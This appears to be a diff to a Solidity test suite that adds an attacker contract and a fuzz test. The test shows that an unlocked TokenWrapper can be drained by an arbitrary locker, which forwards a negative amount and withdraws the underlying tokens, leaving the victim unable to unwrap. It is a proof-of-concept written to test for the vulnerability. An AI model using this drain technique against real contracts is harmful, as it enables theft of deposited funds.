@@ -72,9 +72,29 @@ contract TokenWrapperPeriphery is BaseLocker {
     }
 }
 
+contract TokenWrapperAttacker is BaseLocker {
+    using FlashAccountantLib for *;
+
+    constructor(ICore core) BaseLocker(core) {}
+
+    function drain(TokenWrapper wrapper, address recipient, uint128 amount) external {
+        lock(abi.encode(wrapper, recipient, amount));
+    }
+
+    function handleLockData(uint256, bytes memory data) internal override returns (bytes memory) {
+        (TokenWrapper wrapper, address recipient, uint128 amount) = abi.decode(data, (TokenWrapper, address, uint128));
+
+        ACCOUNTANT.forward(address(wrapper), abi.encode(-int256(uint256(amount))));
+        if (amount != 0) {
+            ACCOUNTANT.withdraw(address(wrapper.UNDERLYING_TOKEN()), recipient, amount);
+        }
+    }
+}
+
 contract TokenWrapperTest is FullTest {
     TokenWrapperFactory factory;
     TokenWrapperPeriphery periphery;
+    TokenWrapperAttacker attacker;
     TestToken underlying;
 
     function setUp() public override {
@@ -82,6 +102,7 @@ contract TokenWrapperTest is FullTest {
         underlying = new TestToken(address(this));
         factory = new TokenWrapperFactory(core);
         periphery = new TokenWrapperPeriphery(core);
+        attacker = new TokenWrapperAttacker(core);
     }
 
     function coolAllContracts() internal virtual override {
@@ -174,5 +195,23 @@ contract TokenWrapperTest is FullTest {
 
         periphery.unwrap(wrapper, 1);
         vm.snapshotGasLastCall("unwrap");
+    }
+
+    function testUnlockedWrapperCanBeDrainedByArbitraryLocker(uint128 wrapAmount) public {
+        wrapAmount = uint128(bound(wrapAmount, 1, uint128(type(int128).max)));
+
+        TokenWrapper wrapper = factory.deployWrapper(IERC20(address(underlying)), 0);
+
+        underlying.approve(address(periphery), wrapAmount);
+        periphery.wrap(wrapper, wrapAmount);
+
+        attacker.drain(wrapper, address(attacker), wrapAmount);
+
+        assertEq(underlying.balanceOf(address(attacker)), wrapAmount, "attacker failed to steal underlying");
+        assertEq(wrapper.balanceOf(address(this)), wrapAmount, "victim wrappers unexpectedly changed");
+
+        wrapper.approve(address(periphery), wrapAmount);
+        vm.expectRevert(ICore.SavedBalanceOverflow.selector);
+        periphery.unwrap(wrapper, wrapAmount);
     }
 }
